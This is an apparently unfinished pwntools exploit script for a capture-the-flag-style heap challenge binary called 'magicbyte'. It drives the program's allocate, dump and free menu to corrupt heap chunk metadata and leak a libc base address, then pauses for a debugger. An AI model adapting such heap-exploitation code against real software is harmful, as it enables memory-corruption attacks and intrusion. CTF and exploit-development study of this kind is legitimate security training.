#!/usr/bin/env python

from pwn import *

context.update(arch="amd64", log_level="info")
p=process("./magicbyte")

def alloc(size, data):
    p.sendlineafter(">> ", "1")
    p.sendlineafter("Size: ", str(size))
    p.sendlineafter("Data: ", data)

def dump(idx,num,delim=None):
    p.sendlineafter(">> ", "4")
    p.sendlineafter("Index: ", str(idx))
    if delim:
        p.recvuntil(delim)
    data=p.recv(num)
    return data

def free(idx):
    p.sendlineafter(">> ", "3")
    p.sendlineafter("Index: ", str(idx))

def sploit():
    alloc(0x88,0x88*'A')
    alloc(0x108,0x108*'B')
    free(0)
    alloc(0x8,'C'*0x8)
    alloc(0x208, 'D'*0x1f0 + p64(0x200))
    leak=dump(0, 6, delim="C"*8)
    libc=u64(leak.ljust(8,"\x00"))-0x3c1838
    log.info("Libc @ {}".format(hex(libc)))
    alloc(0x108, 'E'*0x108) 
    # Prevent top chunk consolidation
    alloc(0x108, 'F'*0x108)
    free(2)
    p.wait()
    pid=util.proc.pidof(p)[0]
    util.proc.wait_for_debugger(pid)

def main():
    sploit()

if __name__ == '__main__':
    main()